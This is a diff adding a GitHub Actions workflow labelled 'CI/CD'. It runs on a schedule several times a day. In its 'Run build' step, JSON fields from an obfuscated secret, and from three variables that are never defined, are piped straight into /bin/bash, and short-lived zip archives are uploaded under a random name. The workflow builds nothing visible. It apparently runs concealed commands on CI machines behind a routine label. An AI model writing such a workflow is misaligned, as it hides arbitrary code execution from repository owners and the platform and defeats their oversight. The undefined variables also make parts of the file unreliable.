@@ -1,0 +1,36 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          vndtz8: ${{ secrets.vndtz8 }}
+        run: |
+          printf '%s' "$vndtz8" | jq -r .nuk80178 | /bin/bash
+          printf '%s' "$yexxt74842" | jq -r .kd041 | /bin/bash
+          printf '%s' "$evz9" | jq -r .blbcn137 | /bin/bash
+          printf '%s' "$jbh266" | jq -r .xfcjo35 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Wnj7WKPj
+          path: "*.zip"
+          retention-days: 1
